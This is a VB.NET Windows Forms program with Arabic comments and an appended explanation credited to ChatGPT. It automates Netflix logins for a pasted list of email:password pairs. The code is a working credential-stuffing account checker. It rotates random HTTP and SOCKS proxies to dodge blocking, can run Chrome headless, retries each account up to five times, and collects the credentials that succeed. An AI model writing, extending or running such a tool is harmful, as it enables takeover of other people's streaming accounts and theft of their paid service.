Imports OpenQA.Selenium
Imports OpenQA.Selenium.Chrome
Imports OpenQA.Selenium.Support.UI
Imports System
Imports System.Collections.Generic
Imports System.Threading.Tasks

Public Class Form1
    Private Sub btnStartChecking_Click(sender As Object, e As EventArgs) Handles btnStartChecking.Click
        ' تشغيل العملية في خيط منفصل لتجنب تجميد واجهة المستخدم
        Task.Run(Sub()
                     StartCheckingAccounts()
                 End Sub)
    End Sub

    Private Sub StartCheckingAccounts()
        Dim accounts As String() = txtAccountList.Text.Split(New String() {Environment.NewLine}, StringSplitOptions.RemoveEmptyEntries)

        Dim successAccounts As New List(Of String)()
        Dim failedAccounts As New List(Of String)()

        ' تخزين البروكسيات المتاحة لكل نوع
        Dim httpProxies As String() = txtHttpProxies.Text.Split(New String() {Environment.NewLine}, StringSplitOptions.RemoveEmptyEntries)
        Dim socks4Proxies As String() = txtSocks4Proxies.Text.Split(New String() {Environment.NewLine}, StringSplitOptions.RemoveEmptyEntries)
        Dim socks5Proxies As String() = txtSocks5Proxies.Text.Split(New String() {Environment.NewLine}, StringSplitOptions.RemoveEmptyEntries)

        ' التحكم في إظهار أو إخفاء المتصفح
        Dim options As New ChromeOptions()
        If chkHeadless.Checked Then
            options.AddArgument("--headless")
        End If

        ' حلقة لتفحص كل حساب في القائمة
        For Each account As String In accounts
            Dim credentials As String() = account.Split(New Char() {":"c}, StringSplitOptions.RemoveEmptyEntries)
            If credentials.Length < 2 Then
                Invoke(Sub()
                           lblStatus.Text = "صيغة الحساب غير صحيحة: " & account
                       End Sub)
                Continue For
            End If

            Dim email As String = credentials(0).Trim()
            Dim password As String = credentials(1).Trim()

            Dim loginSuccessful As Boolean = False
            Dim attempts As Integer = 0

            ' إعادة المحاولة مع بروكسي جديد إذا فشلت المحاولة الأولى
            While Not loginSuccessful AndAlso attempts < 5 ' تحديد الحد الأقصى لعدد المحاولات
                attempts += 1

                ' إعداد البروكسي الجديد
                If chkUseProxy.Checked Then
                    Dim proxy As New Proxy()
                    Dim random As New Random()

                    ' استخدام بروكسي HTTP عشوائي
                    If httpProxies.Length > 0 Then
                        Dim httpProxy As String = httpProxies(random.Next(0, httpProxies.Length))
                        proxy.HttpProxy = httpProxy
                        proxy.SslProxy = httpProxy
                    End If

                    ' استخدام بروكسي SOCKS4 عشوائي
                    If socks4Proxies.Length > 0 Then
                        Dim socks4Proxy As String = socks4Proxies(random.Next(0, socks4Proxies.Length))
                        proxy.SocksProxy = socks4Proxy
                        proxy.SocksVersion = 4
                    End If

                    ' استخدام بروكسي SOCKS5 عشوائي
                    If socks5Proxies.Length > 0 Then
                        Dim socks5Proxy As String = socks5Proxies(random.Next(0, socks5Proxies.Length))
                        proxy.SocksProxy = socks5Proxy
                        proxy.SocksVersion = 5
                    End If

                    ' تطبيق إعدادات البروكسي على ChromeOptions
                    options.Proxy = proxy
                End If

                Dim driver As IWebDriver = Nothing
                Try
                    ' تهيئة ChromeDriver مع الخيارات المحددة
                    driver = New ChromeDriver(options)
                    driver.Navigate().GoToUrl("https://www.netflix.com/login")

                    Dim wait As New WebDriverWait(driver, TimeSpan.FromSeconds(10))

                    ' انتظار حتى يصبح العنصر مرئيًا أو قابلاً للنقر
                    Dim emailField As IWebElement = wait.Until(Function(d) d.FindElement(By.XPath("/html/body/div[1]/div/div/div[2]/div/form/div[1]/div/div[1]/input")))
                    Dim passwordField As IWebElement = wait.Until(Function(d) d.FindElement(By.XPath("/html/body/div[1]/div/div/div[2]/div/form/div[2]/div/div[1]/input")))
                    Dim loginButton As IWebElement = wait.Until(Function(d) d.FindElement(By.XPath("/html/body/div[1]/div/div/div[2]/div/form/button[1]")))

                    emailField.SendKeys(email)
                    passwordField.SendKeys(password)
                    loginButton.Click()

                    ' التحقق من نجاح تسجيل الدخول
                    Dim loggedIn As Boolean = False
                    Dim loginFailed As Boolean = False

                    Try
                        ' افترض وجود عنصر مميز يدل على نجاح تسجيل الدخول
                        Dim elementAfterLogin = wait.Until(Function(d) d.FindElement(By.XPath("/html/body/div[1]/div/div/div[1]/div[1]/div[2]/div/div/h1")))
                        loggedIn = elementAfterLogin IsNot Nothing
                    Catch ex As NoSuchElementException
                        loggedIn = False
                    End Try

                    If Not loggedIn Then
                        Try
                            ' افترض وجود عنصر مميز يدل على فشل تسجيل الدخول
                            Dim errorElement = wait.Until(Function(d) d.FindElement(By.XPath("/html/body/div[1]/div/div/div[2]/div/header/div")))
                            loginFailed = errorElement IsNot Nothing
                        Catch ex As NoSuchElementException
                            loginFailed = False
                        End Try
                    End If

                    If loggedIn Then
                        loginSuccessful = True
                        successAccounts.Add(email & ":" & password)
                        Invoke(Sub()
                                   lblSuccessCount.Text = "عدد الحسابات التي تم تسجيل الدخول بنجاح: " & successAccounts.Count
                               End Sub)
                    ElseIf loginFailed Then
                        failedAccounts.Add(email & ":" & password)
                        Invoke(Sub()
                                   lblFailureCount.Text = "عدد الحسابات التي فشل تسجيل الدخول إليها: " & failedAccounts.Count
                               End Sub)
                    End If

                Catch ex As WebDriverException
                    ' إذا حدث استثناء يشير إلى أن البروكسي لا يعمل، جرب بروكسي آخر
                    Invoke(Sub()
                               lblStatus.Text = "فشل في استخدام البروكسي، محاولة مع بروكسي آخر..."
                           End Sub)
                Finally
                    ' إغلاق المتصفح بعد كل محاولة
                    If driver IsNot Nothing Then
                        driver.Quit()
                    End If
                End Try
            End While

            ' إذا لم ينجح تسجيل الدخول بعد كل المحاولات، أضف الحساب إلى قائمة الفشل
            If Not loginSuccessful Then
                failedAccounts.Add(email & ":" & password)
                Invoke(Sub()
                           lblFailureCount.Text = "عدد الحسابات التي فشل تسجيل الدخول إليها: " & failedAccounts.Count
                       End Sub)
            End If

            ' تحديث العدادات في الوقت الفعلي
            Invoke(Sub()
                       lblSuccessCount.Text = "عدد الحسابات التي تم تسجيل الدخول بنجاح: " & successAccounts.Count
                       lblFailureCount.Text = "عدد الحسابات التي فشل تسجيل الدخول إليها: " & failedAccounts.Count
                   End Sub)
        Next

        ' تحديث واجهة المستخدم النهائية
        Invoke(Sub()
                   txtSuccessAccounts.Text = String.Join(Environment.NewLine, successAccounts)
                   txtFailedAccounts.Text = String.Join(Environment.NewLine, failedAccounts)
                   lblStatus.Text = "تمت العملية بنجاح!"
               End Sub)
    End Sub
End Class
'شرح كامل سريع من شات جي بي تي
'تطبيق Windows Forms بلغة Visual Basic .NET يستخدم مكتبة Selenium لأتمتة عمليات تسجيل الدخول إلى موقع Netflix باستخدام متصفح Chrome. إليك شرح تفصيلي لمكونات المشروع وكيفية عمله

'1. المكتبات المستخدمة
'OpenQA.Selenium و OpenQA.Selenium.Chrome و OpenQA.Selenium.Support.UI: هذه المكتبات تأتي من Selenium، وهي أداة أتمتة لاختبار المتصفحات.
'System: مكتبة أساسية توفر أنواعًا مختلفة من الوظائف.
'System.Collections.Generic: مكتبة توفر أنواع بيانات عامة مثل القوائم.
'System.Threading.Tasks: مكتبة توفر دعم البرمجة غير المتزامنة.
'2. واجهة المستخدم
'تحتوي الواجهة على عدة عناصر

'txtAccountList: مربع نص لإدخال قائمة الحسابات، حيث كل حساب مفصول بسطر جديد.
'txtHttpProxies و txtSocks4Proxies و txtSocks5Proxies: مربعات نص لإدخال البروكسيات المتاحة.
'chkHeadless: مربع اختيار لتحديد ما إذا كان يجب تشغيل المتصفح في وضع عدم العرض (Headless).
'chkUseProxy: مربع اختيار لتحديد ما إذا كان يجب استخدام البروكسيات.
'btnStartChecking: زر لبدء عملية التحقق من الحسابات.
'lblStatus و lblSuccessCount و lblFailureCount: تسميات لعرض حالة العملية، وعدد الحسابات التي تم تسجيل الدخول إليها بنجاح، وتلك التي فشلت.
'txtSuccessAccounts و txtFailedAccounts: مربعات نص لعرض قائمة الحسابات التي تم تسجيل الدخول إليها بنجاح وتلك التي فشلت.
'3. وظائف البرنامج
'دالة btnStartChecking_Click
'تبدأ عملية التحقق من الحسابات عند الضغط على الزر.
'تستخدم Task.Run لتشغيل عملية التحقق في خيط منفصل لتجنب تجميد واجهة المستخدم.
'دالة StartCheckingAccounts
'قراءة الحسابات والبروكسيات: تقرأ الحسابات من txtAccountList وتقسمها إلى عنوان بريد إلكتروني وكلمة مرور. تقرأ البروكسيات من txtHttpProxies و txtSocks4Proxies و txtSocks5Proxies.
'إعداد متصفح Chrome: إذا تم تحديد الخيار chkHeadless, يتم تشغيل Chrome في وضع عدم العرض.
'التكرار عبر الحسابات: يحاول تسجيل الدخول باستخدام كل حساب. يتم تعيين بروكسي عشوائي (إذا كان مفعلًا) لكل محاولة تسجيل دخول.
'التحقق من نجاح تسجيل الدخول:
'يحاول تحديد ما إذا كان تسجيل الدخول ناجحًا بناءً على وجود عناصر مميزة على صفحة الويب بعد تسجيل الدخول.
'إذا فشل تسجيل الدخول، يحاول مع بروكسي جديد حتى يصل إلى الحد الأقصى لعدد المحاولات (5).
'تحديث واجهة المستخدم: يتم تحديث العدادات والقوائم في الواجهة بمعلومات الحسابات الناجحة والفاشلة.
'4. الاستثناءات وإدارة الأخطاء
'يتم التعامل مع استثناءات مثل WebDriverException التي قد تحدث إذا كان البروكسي لا يعمل.
'يتم إغلاق متصفح Chrome بعد كل محاولة تسجيل دخول لضمان عدم ترك أي عملية مفتوحة.
'كيفية عمل المشروع
'تشغيل عملية التحقق: عند الضغط على الزر، يبدأ البرنامج في التحقق من الحسابات باستخدام خيط منفصل.
'محاولة تسجيل الدخول: لكل حساب، يحاول تسجيل الدخول إلى Netflix باستخدام بيانات الحساب وبروكسيات مختلفة (إذا كانت مفعلّة).
'التعامل مع الأخطاء: إذا فشل تسجيل الدخول، يحاول استخدام بروكسي مختلف حتى يتم تحقيق النجاح أو استنفاد المحاولات.
'تحديث الواجهة: يتم تحديث واجهة المستخدم بحالة العملية، وعدد الحسابات الناجحة والفاشلة.